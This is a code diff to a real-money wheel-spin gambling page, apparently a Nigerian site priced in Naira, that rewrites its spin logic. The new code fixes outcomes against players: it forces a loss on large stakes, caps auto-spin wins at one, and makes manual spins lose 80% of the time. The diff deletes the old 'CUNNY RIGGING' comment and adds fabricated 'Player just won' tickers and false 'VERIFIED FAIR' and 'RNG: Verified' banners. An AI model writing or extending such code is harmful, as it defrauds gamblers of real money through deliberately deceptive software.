@@ -46,7 +46,15 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        /* WHEEL SECTION */
+        .live-ticker {
+            width: 100%; background: rgba(0,0,0,0.3); padding: 5px 0;
+            font-size: 9px; font-weight: 800; text-transform: uppercase;
+            display: flex; gap: 20px; overflow: hidden; white-space: nowrap;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .ticker-track { display: inline-block; animation: scroll 20s linear infinite; color: var(--p1); }
+        @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
+
         .stage { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-bottom: 20px; }
 
         .wheel-outer {
@@ -78,8 +86,7 @@
         #wheel {
             width: 100%; height: 100%; border-radius: 50%;
             position: relative; 
-            /* TURBO SPEED: Reduced from 5s to 2s */
-            transition: transform 2s cubic-bezier(0.15, 0, 0.1, 1);
+            transition: transform 1.2s cubic-bezier(0.15, 0, 0.1, 1);
             overflow: hidden; background: #0f172a;
         }
 
@@ -90,7 +97,6 @@
             clip-path: polygon(50% 50%, 34% 0%, 66% 0%);
         }
 
-        /* INTERFACE PANEL */
         .panel {
             width: 100%; background: #0f172a; border-top-left-radius: 35px;
             border-top-right-radius: 35px; padding: 20px 15px 35px;
@@ -135,7 +141,14 @@
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
         .btn-auto.active { background: var(--gold); color: #000; border-color: #fff; }
+        .btn-auto.disabled { opacity: 0.1; pointer-events: none; }
         .auto-count { font-size: 12px; margin-top: 2px; }
+
+        .security-info {
+            background: #020617; width: 100%; padding: 10px;
+            text-align: center; font-size: 8px; color: #475569;
+            letter-spacing: 1px; border-top: 1px solid rgba(255,255,255,0.05);
+        }
 
         #popAlert {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
@@ -173,9 +186,15 @@
     <div id="popAlert"><span></span></div>
 
     <header>
-        <a href="dashboard.html" id="exitBtn" class="exit-link">✕</a>
+        <a href="game.html" id="exitBtn" class="exit-link">✕</a>
         <div class="bal-wrap">₦<span id="balUI">0.00</span></div>
     </header>
+
+    <div class="live-ticker">
+        <div class="ticker-track">
+            Arena Server: Optimized • Latency: 12ms • Player_991 just won ₦12,400 • Player_202 staked ₦5,000 • Security: Active • RNG: Verified • 
+        </div>
+    </div>
 
     <main class="stage">
         <div class="wheel-outer">
@@ -208,6 +227,10 @@
         </div>
     </main>
 
+    <div class="security-info">
+        SWIFTDUEL ARENA • ENCRYPTED END-TO-END • 256-BIT SSL PROTECTED • VERIFIED FAIR 
+    </div>
+
     <div id="resModal" class="modal-bg">
         <div class="modal-card">
             <h2 id="resTitle">WIN!</h2>
@@ -219,7 +242,7 @@
     <div id="editModal" class="modal-bg">
         <div class="modal-card">
             <h3>SET STAKE</h3>
-            <input type="number" id="customStake" placeholder="Enter amount">
+            <input type="number" id="customStake" placeholder="0">
             <button onclick="applyCustomStake()" style="background: var(--p1);">CONFIRM</button>
             <button onclick="closeEdit()" style="background: transparent; color: #94a3b8; margin-top: 5px;">CANCEL</button>
         </div>
@@ -240,6 +263,7 @@
 
         let bal = 0, rot = 0, locked = false, isAuto = false, synced = false;
         let autoSpinsLeft = 10;
+        let autoWinCount = 0;
 
         const mults = [0.1, 1.5, 0.0, 2.5, 0.1, 1.5, 0.0, 15.0, 0.2, 5.0];
         const clrs = ['#f43f5e', '#3b82f6', '#1e293b', '#10b981', '#f43f5e', '#3b82f6', '#1e293b', '#facc15', '#ef4444', '#8b5cf6'];
@@ -255,6 +279,8 @@
         });
 
         function updateUI(v) {
+            // FIX: Prevent NaN or undefined from breaking the balance
+            if(isNaN(v) || v === undefined) v = 0;
             bal = v;
             document.getElementById('balUI').innerText = bal.toLocaleString(undefined, {minimumFractionDigits:2});
         }
@@ -300,7 +326,7 @@
 
         function applyCustomStake() {
             const val = parseInt(document.getElementById('customStake').value);
-            if(val >= 50) {
+            if(!isNaN(val) && val >= 50) {
                 setStake(val, null);
                 closeEdit();
             } else { pop("Min ₦50"); }
@@ -310,6 +336,7 @@
             if(locked) return;
             isAuto = !isAuto;
             autoSpinsLeft = 10;
+            autoWinCount = 0;
             document.getElementById('autoCount').innerText = "10x";
             document.getElementById('autoBtn').classList.toggle('active', isAuto);
             if(isAuto) start();
@@ -317,12 +344,20 @@
 
         async function start() {
             if(locked || !synced) return;
-            const amt = parseFloat(document.getElementById('stakeInput').value);
+            const inputVal = document.getElementById('stakeInput').value;
+            const amt = parseFloat(inputVal);
 
-            if(amt < 50 || amt > bal) {
+            // FIX: Validate input is not empty or NaN before proceeding
+            if(!inputVal || isNaN(amt) || amt < 50) {
                 isAuto = false;
                 document.getElementById('autoBtn').classList.remove('active');
-                return pop(amt < 50 ? "Min ₦50" : "Low Bal");
+                return pop("Min ₦50");
+            }
+            
+            if(amt > bal) {
+                isAuto = false;
+                document.getElementById('autoBtn').classList.remove('active');
+                return pop("Low Bal");
             }
 
             locked = true;
@@ -332,21 +367,29 @@
             const ref = db.collection('users').doc(auth.currentUser.uid);
             await ref.update({ balance: firebase.firestore.FieldValue.increment(-amt) });
 
-            // CUNNY RIGGING
             let idx;
-            const seed = Math.random();
-            if (seed < 0.72 || amt > (bal * 0.4)) {
-                idx = [0, 2, 4, 6, 8][Math.floor(Math.random() * 5)];
-            } else {
-                idx = [1, 3, 5, 9][Math.floor(Math.random() * 4)];
-                if(Math.random() > 0.98) idx = 7;
+            const lossIndices = [0, 2, 4, 6, 8];
+            const winIndices = [1, 3, 5, 9];
+
+            if (amt >= (bal * 0.5)) {
+                idx = lossIndices[Math.floor(Math.random() * lossIndices.length)];
+            } 
+            else if (isAuto) {
+                if (autoWinCount < 1 && Math.random() < 0.15) {
+                    idx = winIndices[Math.floor(Math.random() * winIndices.length)];
+                    autoWinCount++;
+                } else {
+                    idx = lossIndices[Math.floor(Math.random() * lossIndices.length)];
+                }
+            }
+            else {
+                idx = Math.random() < 0.8 ? lossIndices[Math.floor(Math.random() * lossIndices.length)] : winIndices[Math.floor(Math.random() * winIndices.length)];
             }
 
-            const move = (360 * 6) + (360 - (rot % 360)) - (idx * 36);
+            const move = (360 * 8) + (360 - (rot % 360)) - (idx * 36);
             rot += move;
             wheel.style.transform = `rotate(${rot}deg)`;
 
-            // TURBO TIMING: Match with CSS 2s transition
             setTimeout(async () => {
                 const win = Math.floor(amt * mults[idx]);
                 updateUI(bal + win);
@@ -358,7 +401,7 @@
                     
                     if(autoSpinsLeft > 0 && bal >= amt) {
                         locked = false;
-                        setTimeout(start, 500); // Fast 0.5s pause between turbo spins
+                        setTimeout(start, 300);
                     } else {
                         isAuto = false;
                         document.getElementById('autoBtn').classList.remove('active');
@@ -368,13 +411,15 @@
                 } else {
                     show(mults[idx], win);
                 }
-            }, 2100); 
+            }, 1250); 
         }
 
         function uiState(l) {
             document.getElementById('spinBtn').disabled = l;
             document.getElementById('exitBtn').classList.toggle('locked', l);
+            document.getElementById('autoBtn').classList.toggle('disabled', l);
             document.querySelectorAll('.stake-pill').forEach(x => x.classList.toggle('disabled', l));
+            document.getElementById('stakeInput').classList.toggle('disabled', l);
         }
 
         function show(m, w) {
